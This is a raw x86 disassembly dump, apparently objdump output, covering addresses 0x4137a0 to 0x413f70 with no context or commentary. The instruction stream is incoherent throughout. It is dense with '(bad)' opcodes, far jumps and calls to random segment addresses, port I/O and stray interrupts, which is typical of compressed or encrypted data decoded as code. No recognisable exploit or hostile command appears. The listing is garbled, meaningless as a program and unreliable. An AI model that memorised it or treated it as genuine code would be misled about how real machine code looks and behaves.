  4137a0:	bound  esi,QWORD PTR [edx+0x4a]
  4137a3:	jmp    0x4137dc
  4137a5:	mov    dh,0x1f
  4137a7:	sub    edx,DWORD PTR [edi]
  4137a9:	cmp    eax,0x51baa71f
  4137ae:	(bad)  
  4137af:	mov    cl,0xa0
  4137b1:	je     0x413830
  4137b3:	sub    DWORD PTR [edx],eax
  4137b5:	and    al,0x77
  4137b7:	cmp    esi,edi
  4137b9:	mov    esi,0xd924085e
  4137be:	xchg   ebp,eax
  4137bf:	not    BYTE PTR [edx-0x24ec9c85]
  4137c5:	jno    0x413796
  4137c7:	retf   
  4137c8:	(bad)  
  4137c9:	mov    ds:0x565af0e0,al
  4137ce:	push   esp
  4137cf:	ja     0x41377b
  4137d1:	das    
  4137d2:	jl     0x41378f
  4137d4:	pop    es
  4137d5:	cmc    
  4137d6:	adc    al,0x72
  4137d8:	out    dx,eax
  4137d9:	call   0x9fa2:0xecad69b1
  4137e0:	or     DWORD PTR [ebx+0x2f],esi
  4137e3:	stos   DWORD PTR es:[edi],eax
  4137e4:	fsubr  QWORD PTR [edx+0x7bf00087]
  4137ea:	in     eax,0xdf
  4137ec:	ret    0x438
  4137ef:	xchg   edi,eax
  4137f0:	pop    esi
  4137f1:	stos   DWORD PTR es:[edi],eax
  4137f2:	in     al,0xd9
  4137f4:	shl    DWORD PTR [eax],cl
  4137f6:	or     bl,BYTE PTR [edx+0x6e]
  4137f9:	cmc    
  4137fa:	shr    DWORD PTR [eax+0x3b046f68],0xdf
  413801:	out    0xff,al
  413803:	mov    bl,0x56
  413805:	gs sub al,0x45
  413808:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41380a:	in     eax,dx
  41380b:	int    0x8
  41380d:	cs mov bh,0xc8
  413810:	pop    ss
  413811:	cwde   
  413812:	mov    ds:0x45badd4c,al
  413817:	jg     0x41383e
  413819:	ret    
  41381a:	adc    al,0x70
  41381c:	add    DWORD PTR [ecx],eax
  41381e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41381f:	retf   0xbce6
  413822:	std    
  413823:	iret   
  413824:	lods   al,BYTE PTR ds:[esi]
  413825:	aas    
  413826:	push   ecx
  413827:	sahf   
  413828:	leave  
  413829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41382a:	mov    al,0xb6
  41382c:	enter  0x4f55,0x98
  413830:	and    DWORD PTR [edi],esi
  413832:	loop   0x413838
  413834:	add    edx,DWORD PTR ds:0xe710d335
  41383a:	inc    ebp
  41383b:	fadd   st(5),st
  41383d:	dec    ebp
  41383e:	jp     0x413844
  413840:	retf   0xa097
  413843:	xor    al,0xc2
  413845:	cmc    
  413846:	outs   dx,DWORD PTR ds:[esi]
  413847:	not    DWORD PTR [ebp+eax*4+0x54a7ad0e]
  41384e:	mov    ebx,DWORD PTR [ecx-0x42dfcc70]
  413854:	mov    cl,0x77
  413856:	aas    
  413857:	pop    edx
  413858:	dec    ebp
  413859:	(bad)  
  41385a:	inc    edi
  41385b:	ret    0xa035
  41385e:	fadd   st(4),st
  413860:	leave  
  413861:	xlat   BYTE PTR ds:[ebx]
  413862:	pop    ds
  413863:	mov    esp,0xbd6695c4
  413868:	retf   0x33b9
  41386b:	fistp  WORD PTR [eax+0x54b6ee53]
  413871:	mov    eax,ds:0x9d757ae4
  413876:	xchg   esi,eax
  413877:	pop    ss
  413878:	xlat   BYTE PTR ds:[ebx]
  413879:	(bad)
  41387c:	loope  0x41381c
  41387e:	shr    DWORD PTR [di-0x1c],0x2b
  413883:	lods   al,BYTE PTR ds:[esi]
  413884:	xchg   DWORD PTR [edx-0x69],esi
  413887:	fisub  DWORD PTR [esi-0x695d137]
  41388d:	dec    ebp
  41388e:	mov    esp,DWORD PTR [eax]
  413890:	fstp   TBYTE PTR [esi+0x4320c86d]
  413896:	dec    ecx
  413897:	jns    0x4138a5
  413899:	ror    BYTE PTR [ebx+0x3f1e36f],cl
  41389f:	shl    DWORD PTR [ecx],0x92
  4138a2:	jmp    0x15d6:0x8a214c5b
  4138a9:	xchg   esi,eax
  4138aa:	test   DWORD PTR [edi-0x4e364d86],ebp
  4138b0:	popf   
  4138b1:	or     al,0x6c
  4138b3:	outs   dx,DWORD PTR ds:[esi]
  4138b4:	push   edx
  4138b5:	(bad)  
  4138b6:	cmp    BYTE PTR [ecx-0x61],cl
  4138b9:	out    0xc2,eax
  4138bb:	icebp  
  4138bc:	inc    ebx
  4138bd:	pushf  
  4138be:	ret    
  4138bf:	jecxz  0x4138db
  4138c1:	dec    esp
  4138c2:	ss das 
  4138c4:	bound  esi,QWORD PTR [ebx+0x621a56c6]
  4138ca:	pop    ss
  4138cb:	sub    dh,ah
  4138cd:	and    ch,BYTE PTR [esi-0x5cf2805e]
  4138d3:	add    BYTE PTR [eax],0x5f
  4138d6:	nop
  4138d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138d8:	mov    ch,0x84
  4138da:	(bad)  
  4138db:	cmp    cl,BYTE PTR [ecx-0x7a99a011]
  4138e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138e2:	(bad)  
  4138e3:	call   0xa5134460
  4138e8:	(bad)  
  4138ea:	pusha  
  4138eb:	loop   0x413929
  4138ed:	(bad)  
  4138ee:	(bad)  
  4138ef:	aam    0x7d
  4138f1:	dec    edx
  4138f2:	mov    esi,DWORD PTR [ebp+0x3befa6c9]
  4138f8:	fs pop es
  4138fa:	dec    esi
  4138fb:	call   DWORD PTR [ebx]
  4138fd:	sub    al,0x6a
  4138ff:	fiadd  WORD PTR [edx-0x208f56c8]
  413905:	mov    ecx,0x5511bdc6
  41390a:	push   esp
  41390b:	jge    0x413944
  41390d:	xor    al,0xff
  41390f:	cmp    eax,0xffffffbf
  413912:	pop    ebx
  413913:	imul   ebp,DWORD PTR [ebp-0x69e8e218],0xef3c0a2e
  41391d:	(bad)  
  41391e:	iret   
  41391f:	cmc    
  413920:	adc    eax,0x8a82706c
  413925:	lock cwde 
  413927:	repnz xchg ebp,eax
  413929:	add    eax,0x7856663e
  41392e:	push   0x58a935a9
  413933:	or     esi,ebp
  413935:	rcr    esi,cl
  413937:	je     0x4139a3
  413939:	fistp  DWORD PTR [ebx]
  41393b:	out    dx,al
  41393c:	js     0x413981
  41393e:	repz mov ah,BYTE PTR [ecx-0x3b9776ae]
  413945:	fwait
  413946:	inc    ebx
  413947:	cdq    
  413948:	nop
  413949:	cld    
  41394a:	lods   eax,DWORD PTR ds:[esi]
  41394b:	mov    bl,0xb9
  41394d:	pop    eax
  41394e:	cdq    
  41394f:	mov    eax,ds:0x7bb85a4c
  413954:	add    DWORD PTR [edi-0x20],esp
  413957:	shl    BYTE PTR [ebp-0x49],0x3e
  41395b:	mov    ah,0x37
  41395d:	leave  
  41395e:	retf   0xfe2e
  413961:	nop
  413962:	and    eax,0xe0bf1367
  413967:	out    dx,al
  413968:	sub    edi,DWORD PTR [eax-0x1c]
  41396b:	and    al,0xb
  41396d:	cdq    
  41396e:	imul   eax,DWORD PTR [ebx-0x22],0xe26491b1
  413975:	dec    ebx
  413976:	je     0x413963
  413978:	ds mov eax,0x23a4df73
  41397e:	int3   
  41397f:	test   al,0xb0
  413981:	or     eax,0x8205b300
  413986:	dec    edi
  413987:	jno    0x4139d3
  413989:	arpl   WORD PTR [eax+ebx*1+0x3d],dx
  41398d:	cmp    al,0xe8
  41398f:	aas    
  413990:	adc    BYTE PTR [esi+0x64],ah
  413993:	mov    ebx,0x7385e46b
  413998:	stos   BYTE PTR es:[edi],al
  413999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41399a:	pop    edi
  41399b:	out    dx,eax
  41399c:	rcr    DWORD PTR [eax-0x6],0xe8
  4139a0:	cmp    DWORD PTR [ebx-0x62259905],ebx
  4139a6:	dec    ebx
  4139a7:	sbb    DWORD PTR [esi+0x492a7819],edi
  4139ad:	out    0x4,eax
  4139af:	imul   edx,DWORD PTR [edi-0x4d],0x52
  4139b3:	jmp    0x4dd80442
  4139b8:	scas   al,BYTE PTR es:[edi]
  4139b9:	adc    cl,bh
  4139bb:	push   ss
  4139bc:	jo     0x413a21
  4139be:	sbb    esi,DWORD PTR [esp+eiz*4]
  4139c1:	lods   eax,DWORD PTR ds:[esi]
  4139c2:	push   ebx
  4139c3:	xchg   edx,eax
  4139c4:	adc    DWORD PTR [ecx],eax
  4139c6:	in     eax,dx
  4139c7:	jae    0x413a44
  4139c9:	mov    ebp,0xa1115eca
  4139ce:	in     eax,0xbc
  4139d0:	mov    al,0x45
  4139d2:	cdq    
  4139d3:	in     al,dx
  4139d4:	inc    edi
  4139d5:	ds sub eax,0xc6213d1f
  4139db:	lds    eax,FWORD PTR [esi+0x2c]
  4139de:	jecxz  0x413a3d
  4139e0:	inc    esp
  4139e1:	rcr    DWORD PTR [edi],cl
  4139e3:	mov    al,ds:0xa6478212
  4139e8:	dec    esp
  4139e9:	lea    edx,[ecx+0x4db85a9a]
  4139ef:	jle    0x413a18
  4139f1:	or     BYTE PTR [edi-0x52],ah
  4139f4:	(bad)  
  4139f5:	dec    ebp
  4139f6:	(bad)  
  4139f7:	sahf   
  4139f8:	test   BYTE PTR [ecx+0x5cc22d47],0x4b
  4139ff:	inc    esi
  413a00:	or     edi,DWORD PTR [edi-0x898a7b5]
  413a06:	push   esp
  413a07:	shr    BYTE PTR [esi+0x7d60c366],1
  413a0d:	scas   al,BYTE PTR es:[edi]
  413a0e:	ja     0x413a8e
  413a10:	xor    dl,BYTE PTR [edi+0x36158d8f]
  413a16:	aaa    
  413a17:	(bad)  
  413a18:	adc    edi,DWORD PTR [edi]
  413a1a:	daa    
  413a1b:	scas   eax,DWORD PTR es:[edi]
  413a1c:	or     DWORD PTR ds:0x589ccc99,ebx
  413a22:	and    eax,0x1f6c0f1a
  413a27:	xchg   ebp,eax
  413a28:	ret    
  413a29:	ret    0x5276
  413a2c:	inc    eax
  413a2d:	jno    0x4139da
  413a2f:	ss or  al,0xc7
  413a32:	cwde   
  413a33:	or     eax,0xf50e8d03
  413a38:	stos   DWORD PTR es:[edi],eax
  413a39:	call   0xbea8d2a9
  413a3e:	addr16 cwde 
  413a40:	shl    dl,1
  413a42:	test   al,0x23
  413a44:	popa   
  413a45:	push   ss
  413a46:	jp     0x413a04
  413a48:	push   cs
  413a49:	ficomp WORD PTR [edx-0x67]
  413a4c:	retf   
  413a4d:	inc    al
  413a4f:	xor    cl,BYTE PTR [esi+0x49e6e36b]
  413a55:	xchg   DWORD PTR [esi+0x1b],eax
  413a58:	(bad)  
  413a59:	retf   
  413a5a:	add    edi,DWORD PTR [ebp-0xa]
  413a5d:	push   ss
  413a5e:	xchg   esi,eax
  413a5f:	mov    bh,0x12
  413a61:	ss sbb al,0xff
  413a64:	adc    BYTE PTR [eax+0x4c9f78de],cl
  413a6a:	xor    DWORD PTR ds:0x45dac205,ebp
  413a70:	fistp  QWORD PTR [edi+0xf]
  413a73:	mov    ch,0x87
  413a75:	lock jge 0x413a80
  413a78:	adc    eax,0xd8a612a3
  413a7d:	not    BYTE PTR [ebp-0xe]
  413a80:	mov    edx,cs
  413a82:	push   esi
  413a83:	imul   ecx,eax,0x584845fd
  413a89:	mov    esp,0xf2351e90
  413a8e:	retf   0xc499
  413a91:	push   ecx
  413a92:	xchg   edx,eax
  413a93:	loop   0x413b0e
  413a95:	and    ebx,ecx
  413a97:	mov    esi,0xf54ca566
  413a9c:	sub    bl,BYTE PTR [ebp+0x561c7b03]
  413aa2:	xchg   DWORD PTR [edi-0x64a6011a],ecx
  413aa8:	and    BYTE PTR [ebx+0x20],0x94
  413aac:	or     DWORD PTR [edx],ebx
  413aae:	pop    edx
  413aaf:	sub    eax,0xa98f4bdb
  413ab4:	out    0xaf,eax
  413ab6:	int    0xb5
  413ab8:	icebp  
  413ab9:	(bad)  
  413aba:	icebp  
  413abb:	jl     0x413a6d
  413abd:	inc    edx
  413abe:	jle    0x413ac2
  413ac0:	or     eax,0xe6ef0702
  413ac5:	aam    0xe6
  413ac7:	mov    BYTE PTR [edi],cl
  413ac9:	jge    0x413a4c
  413acb:	stos   BYTE PTR es:[edi],al
  413acc:	mov    ds:0xfe9a603d,eax
  413ad1:	jne    0x413ad2
  413ad3:	test   al,0xb0
  413ad6:	div    DWORD PTR [edi]
  413ad8:	in     al,0xb7
  413ada:	lds    edi,FWORD PTR [ecx+0x1f837bd7]
  413ae0:	inc    edx
  413ae1:	and    ecx,DWORD PTR [edi-0x6f]
  413ae4:	adc    ebx,DWORD PTR ds:0x7ab729bd
  413aea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413aeb:	test   eax,0x91472736
  413af0:	sbb    ebp,DWORD PTR [edi]
  413af2:	shl    BYTE PTR ds:0x3a234201,cl
  413af8:	add    BYTE PTR [eax+0x74],al
  413afb:	js     0x413a9a
  413afd:	inc    ecx
  413afe:	jmp    0x413a8c
  413b00:	leave  
  413b01:	popf   
  413b02:	push   eax
  413b03:	mov    ebx,0x19bd4499
  413b08:	inc    ebx
  413b09:	punpcklbw mm2,DWORD PTR ds:0x10a3e036
  413b10:	cmp    esi,DWORD PTR [ecx]
  413b12:	mov    ecx,0xe88d9cf5
  413b17:	imul   edi,DWORD PTR [esi+0x209fe262],0xffffffe4
  413b1e:	repnz pop ebx
  413b20:	and    DWORD PTR [ebp+0x4e26906c],ecx
  413b26:	inc    ecx
  413b27:	(bad)  
  413b28:	xor    DWORD PTR [ebp+0x5b],esp
  413b2b:	clc    
  413b2c:	jmp    0x2ba6c390
  413b31:	mov    ecx,0xf7f00c4
  413b36:	xchg   esp,eax
  413b37:	cmp    DWORD PTR ds:0xb7508f06,ebp
  413b3d:	sbb    DWORD PTR [ecx-0x6897557e],ebp
  413b43:	inc    ebx
  413b44:	retf   
  413b45:	pop    es
  413b46:	add    DWORD PTR [ebx+0x49359247],ebx
  413b4c:	xchg   ebp,eax
  413b4d:	adc    ecx,edi
  413b4f:	push   esi
  413b50:	popa   
  413b51:	ja     0x413b11
  413b53:	mov    cl,0xb2
  413b55:	push   esp
  413b56:	(bad)
  413b59:	mov    bl,0x39
  413b5b:	jnp    0x413b9a
  413b5d:	aas    
  413b5e:	cmc    
  413b5f:	jg     0x413b41
  413b61:	pop    edi
  413b62:	sub    DWORD PTR [esi-0x38dd0816],ebx
  413b68:	mov    esi,0xbbeb5f2b
  413b6d:	mov    edi,0xe710f3b0
  413b72:	mov    WORD PTR [ecx+0x3830cc97],cs
  413b78:	ja     0x413bc7
  413b7a:	mov    ch,0x46
  413b7c:	(bad)  
  413b7e:	mov    al,0xc3
  413b80:	sar    bl,1
  413b82:	and    al,0x7
  413b84:	jo     0x413bb3
  413b86:	xor    bh,dl
  413b88:	ds mov edx,0xdc8493c6
  413b8e:	test   eax,0xaeb3b6a1
  413b93:	stos   BYTE PTR es:[edi],al
  413b94:	rcr    DWORD PTR [eax+0x2ce5438a],0x6d
  413b9b:	rcl    DWORD PTR [ebp-0x5c3d9ff0],1
  413ba1:	and    ah,BYTE PTR [esi+0x5d]
  413ba4:	in     eax,0x7d
  413ba6:	jp     0x413c17
  413ba8:	dec    eax
  413ba9:	and    BYTE PTR [esi],cl
  413bab:	ss push ss
  413bad:	arpl   WORD PTR [edx+eax*4-0x20],di
  413bb1:	push   ecx
  413bb2:	gs in  eax,dx
  413bb4:	mov    edx,0xa5f3b9b2
  413bb9:	ds pop ss
  413bbb:	and    ebp,0xf63d7dbf
  413bc1:	scas   al,BYTE PTR es:[edi]
  413bc2:	(bad)  
  413bc4:	int    0xae
  413bc6:	cmp    bh,0x55
  413bc9:	pop    ds
  413bca:	loopne 0x413bee
  413bcc:	sbb    al,ah
  413bce:	cmp    DWORD PTR [edx+0x2b9e12ad],ebp
  413bd4:	ret    0x5fe4
  413bd7:	mov    dl,0x60
  413bd9:	retf   
  413bda:	scas   eax,DWORD PTR es:[edi]
  413bdb:	inc    ebx
  413bdc:	or     ebx,ebx
  413bde:	sbb    DWORD PTR [ebp-0x816fbe2],edi
  413be4:	sbb    eax,0x75c9efb
  413be9:	mov    edx,0xe46219a5
  413bee:	neg    DWORD PTR [ecx+eax*4-0x4bb8cba8]
  413bf5:	int3   
  413bf6:	stc    
  413bf7:	cmp    eax,esp
  413bf9:	cmp    bl,dh
  413bfb:	outs   dx,BYTE PTR ds:[esi]
  413bfc:	cmp    esi,esi
  413bfe:	push   esp
  413bff:	repnz bound ebp,QWORD PTR [edi+0x26b65483]
  413c06:	fstp   DWORD PTR ds:0x22a4c3c9
  413c0c:	dec    esp
  413c0d:	addr16 pop ds
  413c0f:	push   ss
  413c10:	or     eax,0xc10d061d
  413c15:	ror    DWORD PTR [ecx],1
  413c17:	xlat   BYTE PTR ds:[ebx]
  413c18:	(bad)  
  413c19:	jmp    0x9d62:0xedb2fc54
  413c20:	shr    BYTE PTR [ebx+0x2a],1
  413c23:	cmp    al,0x3c
  413c25:	popf   
  413c26:	mov    ebx,0x9f69af52
  413c2b:	ins    DWORD PTR es:[edi],dx
  413c2c:	and    ebx,edi
  413c2e:	pop    ebp
  413c2f:	es cmp al,0xcb
  413c32:	fstp   QWORD PTR [ebx+0x7a]
  413c35:	adc    DWORD PTR gs:[edx-0x62490cb7],esp
  413c3c:	mov    cl,0xa2
  413c3e:	(bad)  
  413c3f:	sbb    eax,0x68bf69f7
  413c44:	fld    QWORD PTR [ecx+ecx*2]
  413c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c48:	jns    0x413c08
  413c4a:	jmp    0x6a4b651
  413c4f:	xor    esi,DWORD PTR [edi]
  413c51:	inc    ebx
  413c52:	scas   al,BYTE PTR es:[edi]
  413c53:	test   eax,0x9d4b6cde
  413c58:	mov    ds:0x5668d835,al
  413c5d:	adc    al,0x41
  413c5f:	add    al,0x44
  413c61:	les    edx,FWORD PTR [edi+0x60be7ef9]
  413c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c68:	fwait
  413c69:	ja     0x413c59
  413c6b:	dec    edi
  413c6c:	loope  0x413c05
  413c6e:	imul   esp,DWORD PTR [esi-0x52],0xffffffea
  413c72:	popa   
  413c73:	cmp    al,0xd5
  413c75:	add    eax,0x40b12eb2
  413c7a:	test   eax,0xb111913c
  413c7f:	mov    esp,0x5d069a88
  413c84:	jbe    0x413c81
  413c86:	push   eax
  413c87:	loopne 0x413c97
  413c89:	call   0x92ac:0xff4e9569
  413c90:	cld    
  413c91:	sub    al,0xd5
  413c93:	repz aas 
  413c95:	int3   
  413c96:	add    dh,cl
  413c98:	sahf   
  413c99:	pop    ebx
  413c9a:	(bad)  
  413c9b:	or     al,0xe6
  413c9d:	pop    eax
  413c9e:	aaa    
  413c9f:	retf   0x347e
  413ca2:	mov    ebp,ebx
  413ca4:	and    DWORD PTR [ebx-0x459a060a],esp
  413caa:	loopne 0x413ca8
  413cac:	std    
  413cad:	mov    edi,0x8415837c
  413cb2:	xor    DWORD PTR [ebx],esp
  413cb4:	scas   al,BYTE PTR es:[edi]
  413cb5:	fcmove st,st(4)
  413cb7:	inc    esp
  413cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cb9:	mov    ch,0x6
  413cbb:	add    al,0xda
  413cbd:	test   al,0xc7
  413cbf:	xchg   DWORD PTR [edi],esp
  413cc1:	cli    
  413cc2:	xor    eax,0x9e482b11
  413cc7:	xor    eax,0x85f373b
  413ccc:	bound  ebp,QWORD PTR [ebp+0x3cd2d4d2]
  413cd2:	pop    ecx
  413cd3:	fidivr WORD PTR ds:0x63d0bb6f
  413cd9:	aam    0x76
  413cdb:	pop    ebx
  413cdc:	mov    dh,BYTE PTR [ebp+0x33c56c3]
  413ce2:	pop    ss
  413ce3:	ins    DWORD PTR es:[edi],dx
  413ce4:	cli    
  413ce5:	outs   dx,BYTE PTR ds:[esi]
  413ce6:	imul   esi,DWORD PTR [eax+esi*4-0x7e16ee07],0x2d
  413cee:	inc    edx
  413cef:	(bad)  
  413cf0:	in     al,dx
  413cf1:	in     al,0xe7
  413cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cf4:	pop    ss
  413cf5:	mov    ds:0xbb3770e1,al
  413cfa:	sub    edx,DWORD PTR [eax]
  413cfc:	cmp    BYTE PTR [ebp+ebp*4+0x45fffa7a],0x3
  413d04:	stos   DWORD PTR es:[edi],eax
  413d05:	push   edx
  413d06:	xlat   BYTE PTR ds:[ebx]
  413d07:	pop    edx
  413d08:	mov    ds:0x44e71666,al
  413d0d:	sub    al,BYTE PTR [esi-0x1a]
  413d10:	cmp    bl,BYTE PTR [edi+esi*2+0x5e]
  413d14:	pop    edx
  413d15:	cld    
  413d16:	mov    ebx,0x6f6b02
  413d1b:	lods   eax,DWORD PTR ds:[esi]
  413d1c:	jae    0x413d19
  413d1e:	dec    ebx
  413d1f:	int3   
  413d20:	retf   0x45d7
  413d23:	adc    ecx,DWORD PTR [ecx]
  413d25:	ins    BYTE PTR es:[edi],dx
  413d26:	push   esp
  413d27:	cmp    eax,0xdcb6a176
  413d2c:	add    al,0x2
  413d2e:	sbb    eax,0xb2460d8
  413d33:	ins    BYTE PTR es:[edi],dx
  413d34:	inc    edi
  413d35:	out    0x3a,eax
  413d37:	dec    ebx
  413d38:	into   
  413d39:	sub    cl,BYTE PTR [esi+0x25466fcf]
  413d3f:	cs (bad) 
  413d41:	int3   
  413d42:	repz pushf 
  413d44:	add    DWORD PTR [edx+0x18],edi
  413d47:	jne    0x413d54
  413d49:	add    DWORD PTR [esi+edx*8-0x585f74b3],0xa
  413d51:	pop    eax
  413d52:	xor    BYTE PTR [edi+eax*2-0xa],0xe8
  413d57:	outs   dx,DWORD PTR es:[esi]
  413d59:	stos   BYTE PTR es:[edi],al
  413d5a:	jmp    0x1904:0xa2ef02c4
  413d61:	xchg   ecx,eax
  413d62:	(bad)  
  413d63:	mov    bl,0xc7
  413d65:	mov    gs,WORD PTR [edx-0x6c]
  413d68:	xchg   ecx,eax
  413d69:	addps  xmm5,xmm4
  413d6c:	xlat   BYTE PTR ds:[ebx]
  413d6d:	sahf   
  413d6e:	fwait
  413d6f:	(bad)  
  413d70:	and    DWORD PTR [esi-0xa6248e9],eax
  413d76:	mov    ds:0xd866f72a,eax
  413d7b:	push   esi
  413d7c:	enter  0x7fa2,0xee
  413d80:	ret    
  413d81:	add    ebx,DWORD PTR [edx+0x71e44f09]
  413d87:	(bad)  
  413d88:	mov    edx,0x3da70ac6
  413d8d:	jae    0x413e09
  413d8f:	add    DWORD PTR [edi+0x7b],edi
  413d92:	add    ebp,DWORD PTR [di-0x1c28]
  413d97:	std    
  413d98:	mov    esp,0x5bd8c47e
  413d9d:	lds    ebx,FWORD PTR [ebx]
  413d9f:	and    eax,0x83ef90ca
  413da4:	dec    esp
  413da5:	mov    esi,0xb0b01eaa
  413daa:	call   0xeb6262f6
  413daf:	(bad)  
  413db0:	xor    edi,edi
  413db2:	cmp    eax,0x4671b464
  413db7:	ret    0x48
  413dba:	jnp    0x413de5
  413dbc:	mov    esp,0xbcad953c
  413dc1:	pop    ds
  413dc2:	pop    eax
  413dc3:	adc    esi,esi
  413dc5:	popf   
  413dc6:	sti    
  413dc7:	pop    edi
  413dc8:	ret    
  413dc9:	(bad)  
  413dcb:	leave  
  413dcc:	sti    
  413dcd:	xchg   esi,eax
  413dce:	arpl   sp,si
  413dd0:	cmp    BYTE PTR [esp+edi*2-0x55b8e5bf],bh
  413dd7:	fsubr  DWORD PTR [edi]
  413dd9:	mov    dl,BYTE PTR [eax-0x21]
  413ddc:	mov    bh,0xbb
  413dde:	(bad)  
  413ddf:	pop    esi
  413de0:	jmp    0x7f:0x511de92e
  413de7:	push   0x2c
  413de9:	pop    es
  413dea:	sar    DWORD PTR [esi],0x79
  413ded:	xor    BYTE PTR ds:0x363edee4,cl
  413df3:	dec    ebx
  413df4:	jno    0x413dd3
  413df6:	mov    bh,0xc4
  413df8:	mov    edi,0x585c0ba5
  413dfd:	out    0xd5,eax
  413dff:	cmp    DWORD PTR [ebp+0x15f96dfe],0x76c5733c
  413e09:	pop    ss
  413e0a:	arpl   di,cx
  413e0c:	inc    esi
  413e0d:	sub    ah,BYTE PTR [ecx-0x36]
  413e10:	add    ah,BYTE PTR [edx]
  413e12:	pop    edx
  413e13:	(bad)  
  413e14:	shl    BYTE PTR [ecx+0x76d9b17e],0xef
  413e1b:	xor    eax,0x4b82ad71
  413e20:	lahf   
  413e21:	das    
  413e22:	add    BYTE PTR [edi+0x29],bl
  413e25:	test   eax,0xe18d299f
  413e2a:	iret   
  413e2b:	es jp  0x413e78
  413e2e:	sbb    BYTE PTR [edx+0x1e],bl
  413e31:	mov    cl,0xa
  413e33:	lock add bh,BYTE PTR [ebx]
  413e36:	mov    cl,0xc0
  413e38:	xlat   BYTE PTR ds:[bx]
  413e3a:	inc    edx
  413e3b:	sub    dl,ch
  413e3d:	or     dl,BYTE PTR [eax]
  413e3f:	xchg   ch,dh
  413e41:	add    eax,ebx
  413e43:	aas    
  413e44:	or     al,0x85
  413e46:	call   0xab26:0x9145b6bb
  413e4d:	mov    ds:0x89ab9d9e,al
  413e52:	push   ecx
  413e53:	pop    es
  413e54:	out    0xc5,al
  413e56:	jo     0x413dfe
  413e58:	arpl   WORD PTR [edx+0x185336e9],dx
  413e5e:	xchg   cl,dh
  413e60:	inc    edi
  413e61:	int3   
  413e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e63:	cmp    al,0x92
  413e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e66:	xchg   edx,eax
  413e67:	add    DWORD PTR [ecx-0x41],0xd0be2041
  413e6e:	mov    ah,BYTE PTR [edi]
  413e70:	sub    BYTE PTR [ebx-0x40dbb735],cl
  413e76:	cmp    eax,0x6118d390
  413e7b:	sbb    BYTE PTR [ecx+ecx*4+0x7ab40366],ch
  413e82:	(bad)  
  413e83:	les    ebx,FWORD PTR [edx+0x541c4669]
  413e89:	pop    edi
  413e8a:	(bad)  
  413e8b:	xor    esi,DWORD PTR [ecx]
  413e8d:	push   edi
  413e8e:	retf   0x371e
  413e91:	adc    DWORD PTR [esi-0x6d],ebp
  413e94:	scas   al,BYTE PTR es:[edi]
  413e95:	xchg   esp,eax
  413e96:	sbb    BYTE PTR [ebx-0x708d1cce],dl
  413e9c:	mov    ch,0x2c
  413e9e:	fs lahf 
  413ea0:	and    ebp,ebp
  413ea2:	fidivr DWORD PTR [ecx+ebx*4]
  413ea5:	cmp    eax,0x401f180f
  413eaa:	imul   esp,DWORD PTR [edi+0x2743c320],0xffffff83
  413eb1:	dec    ax
  413eb3:	nop
  413eb4:	or     eax,0x791d29a3
  413eb9:	adc    BYTE PTR [esi],dl
  413ebb:	mov    ds:0x4331dde2,eax
  413ec0:	test   eax,0x8fdead04
  413ec5:	test   al,0xb8
  413ec7:	adc    eax,0xa8bda959
  413ecc:	popf   
  413ecd:	pop    es
  413ece:	cmc    
  413ecf:	jae    0x413eb4
  413ed1:	bound  ecx,QWORD PTR [eax-0x28f904d2]
  413ed7:	mov    bl,0x3e
  413ed9:	pop    es
  413eda:	fs mov bl,0x9c
  413edd:	stos   DWORD PTR es:[edi],eax
  413ede:	push   edx
  413edf:	test   BYTE PTR [eax-0x2ca188ff],dh
  413ee5:	adc    ecx,DWORD PTR [ebx-0x41]
  413ee8:	cld    
  413ee9:	dec    ebp
  413eea:	xor    ebx,DWORD PTR [ecx+0x54]
  413eed:	loop   0x413ef1
  413eef:	cmp    edx,DWORD PTR [ebp-0x12]
  413ef2:	out    0xfe,eax
  413ef4:	cmp    DWORD PTR [ebp-0x59],ecx
  413ef7:	pop    ecx
  413ef8:	xlat   BYTE PTR ds:[ebx]
  413ef9:	cmp    al,0xde
  413efb:	(bad)
  413efe:	sbb    edi,DWORD PTR [esi-0x5e]
  413f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f02:	ins    DWORD PTR es:[edi],dx
  413f03:	cwde   
  413f04:	(bad)  
  413f05:	pushf  
  413f06:	cmp    eax,ecx
  413f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f09:	leave  
  413f0a:	mov    edx,0xa6dd1060
  413f0f:	cmp    esp,DWORD PTR [eax-0x7da206ef]
  413f15:	lock sbb al,0xc4
  413f18:	aam    0x5d
  413f1a:	inc    ebx
  413f1b:	and    BYTE PTR [edx-0x783fede6],bh
  413f21:	inc    esi
  413f22:	mov    bh,0x9a
  413f24:	xchg   ebx,eax
  413f25:	jae    0x413f9c
  413f27:	or     BYTE PTR ss:[esi+0x48],0xce
  413f2c:	pop    es
  413f2d:	dec    eax
  413f2e:	jmp    0xd1b6e988
  413f33:	das    
  413f34:	inc    ebp
  413f35:	(bad)  
  413f36:	mov    esi,0x4041548
  413f3b:	mov    edi,0x14c03b1d
  413f40:	xlat   BYTE PTR ds:[ebx]
  413f41:	push   edi
  413f42:	add    DWORD PTR [esi+0x32],0x60be003c
  413f49:	push   edi
  413f4a:	or     al,0x1e
  413f4c:	iret   
  413f4d:	jecxz  0x413f3f
  413f4f:	push   edi
  413f50:	cmp    eax,0x4480c65a
  413f55:	push   eax
  413f56:	adc    DWORD PTR [edx-0x62ddec0f],ecx
  413f5c:	inc    edi
  413f5d:	inc    esp
  413f5e:	fld    QWORD PTR [eax-0x1d]
  413f61:	sub    BYTE PTR [esp+edi*2],ah
  413f64:	jl     0x413f8e
  413f66:	inc    ebx
  413f67:	rol    ch,cl
  413f69:	mov    eax,ds:0xa0b43905
  413f6e:	scas   eax,DWORD PTR es:[edi]
  413f6f:	scas   al,BYTE PTR es:[edi]
  413f70:	push   ebp
